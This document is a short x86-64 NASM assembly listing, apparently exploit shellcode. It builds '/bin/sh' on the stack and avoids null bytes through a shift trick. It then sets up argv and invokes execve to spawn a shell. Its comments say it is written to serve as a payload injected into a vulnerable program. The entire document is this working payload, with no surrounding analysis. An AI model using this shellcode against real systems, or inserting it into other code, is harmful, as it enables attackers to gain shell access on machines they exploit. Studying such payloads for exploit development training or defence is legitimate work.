    BITS 64
    section .text
            global _start
 
    _start:
            sub     rsp, 0x40   ; make space on stack so pushes dont clobber code
            xor     rax, rax    ; rax = 0
            xor     rdx, rdx    ; rdx = 0
            mov     qword rbx, '//bin/sh'
            shr     rbx, 0x8    ; "/bin/sh\x00" without putting a null byte in the payload
            push    rbx
            mov     rdi, rsp    ; set rdi "/bin/sh"
            push    rax         ; null
            push    rdi         ; argv[0] = "/bin/sh"
            mov     rsi, rsp    ; rsi = &argv[0]
            mov     al, 0x3b    ; 59 execve
            syscall
